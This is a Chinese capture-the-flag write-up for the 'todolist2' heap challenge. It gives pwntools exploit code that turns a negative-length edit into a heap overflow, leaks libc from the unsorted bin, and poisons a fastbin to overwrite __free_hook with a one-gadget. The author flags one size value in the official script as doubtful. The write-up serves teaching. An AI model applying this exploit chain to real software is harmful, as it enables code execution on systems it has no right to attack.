# todolist2

## 题目简述

`edit` 功能接收用户给出的写入长度，却允许输入 `-1`。长度在后续处理中被当作无符号数，导致可以从当前 chunk 向后写任意长度。利用堆溢出伪造相邻 chunk 的大小，先构造覆盖 unsorted-bin chunk 泄露 libc，再把 fastbin 的 `fd` 改到 `__free_hook`，写入 one-gadget 后通过 `free` 触发。

## 解题过程

封装菜单时，`edit` 固定提交负长度：

```python
def take(size):
    io.sendlineafter(b"exit", b"1")
    io.sendlineafter(b"write?", str(size).encode())


def delete(index):
    io.sendlineafter(b"exit", b"2")
    io.sendlineafter(b"delete?", str(index).encode())


def edit(index, content):
    io.sendlineafter(b"exit", b"3")
    io.sendlineafter(b"edit?", str(index).encode())
    io.sendlineafter(b"write?", b"-1")
    io.sendline(content)


def show(index):
    io.sendlineafter(b"exit", b"4")
    io.sendlineafter(b"check?", str(index).encode())
```

先分配两个 `0x40` 小块、一个 `0x500` 大块和一个隔离块：

```python
take(0x40)   # 0
take(0x40)   # 1
take(0x500)  # 2
take(0x40)   # 3
```

从 0 号块向后覆盖 1 号块元数据，把其 `size` 改为 `0x561`。这个伪大小恰好跨过原 1、2 号块；释放 1 后得到覆盖 2 号块的 unsorted-bin chunk：

```python
edit(0, b"A" * 0x40 + p64(0) + p64(0x561))
delete(1)
take(0x40)  # 4，从伪造的大块前端切出
show(2)
```

2 号索引仍位于被覆盖区域，显示内容会泄露 `main_arena` 指针。题目附带 glibc 2.27，对应偏移为 `0x3ebca0`：

```python
leak = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
libc.address = leak - 0x3EBCA0
free_hook = libc.sym["__free_hook"]
one_gadget = libc.address + 0x4F432
```

释放刚切出的 4 号 fastbin chunk，再次从 0 号块溢出并把 `fd` 指向 `__free_hook`。官方 PDF 的脚本在 size 字段处原样写了 `p64(51)`；这里的 `51` 是十进制，即 `0x33`：

```python
delete(4)
edit(
    0,
    b"A" * 0x40
    + p64(0)
    + p64(0x33)
    + p64(free_hook),
)

take(0x40)  # 5，取回原 fastbin chunk
take(0x40)  # 6，返回 __free_hook 附近
edit(6, p64(one_gadget))
delete(5)
io.interactive()
```

这一字面值存在必须指出的复现疑点：在标准 amd64 glibc 2.27 中，如果 `take(0x40)` 最终原样调用 `malloc(0x40)`，对应 chunk 的 size 字段通常应为 `0x51`，而不是 `0x33`。因此不能脱离附件断言 `p64(51)` 一定正确；复现时应检查程序是否对申请大小做了换算，并根据实际 fastbin 链修正 size 字段。官方脚本想表达的利用链仍然清楚：让下一次同尺寸申请返回 `__free_hook`，写入 one-gadget，再以 `free` 触发。官方 PDF 没有保存动态 flag。

## 方法总结

负数长度漏洞通常源于有符号校验与无符号使用之间的不一致。获得任意长度堆溢出后仍要按阶段构造：伪造合并范围以制造重叠、从 unsorted bin 泄露 libc、再毒化 fastbin 指针覆盖 hook。硬编码的 `0x3ebca0`、one-gadget 和 chunk size 都依赖题目程序及其 libc；官方脚本出现十进制与十六进制语义不一致时，应以实际分配路径和堆状态为准，而不能机械照抄。
